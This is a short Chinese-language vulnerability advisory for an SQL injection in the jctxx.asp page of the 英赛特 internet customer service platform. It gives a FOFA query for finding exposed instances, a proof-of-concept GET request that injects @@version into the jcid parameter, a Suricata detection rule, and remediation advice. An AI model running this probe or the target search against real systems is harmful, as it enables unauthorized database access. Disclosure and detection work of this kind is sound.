# 英赛特互联网客户服务平台 jctxx.asp处 SQL注入漏洞 

英赛特互联网客户服务平台 jctxx.asp处 SQL注入漏洞，攻击者可进行sql注入攻击获取数据库信息或者权限。

# 影响版本

英赛特互联网客户服务平台

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="英赛特互联网客户服务平台"

POC/EXP：

```
GET /csccmise/jctxx.asp?jcid=@@version  HTTP/1.1
Host: 127.0.0.1
Accept-Encoding: gzip
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0
```

![image-20260122163310170](assets/image-20260122163310170.png)

sonrt规则：

```
alert http any any -> $HOME_NET any (
    msg:"英赛特互联网客户服务平台 - MSSQL SQL Injection via jctxx.asp";
    flow:to_server,established;
    http.method; content:"GET";
    http.uri; content:"/csccmise/jctxx.asp";
    http.uri; pcre:"/jcid=@@version/i";
    metadata:
        service http,
        affected_product "英赛特互联网客户服务平台",
        vulnerability_type "MSSQL SQL Injection",
        attack_target "database_server",
        severity "high";
    classtype:sql-injection;
    sid:1000589;
    rev:1;
    priority:1;
)
```

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。
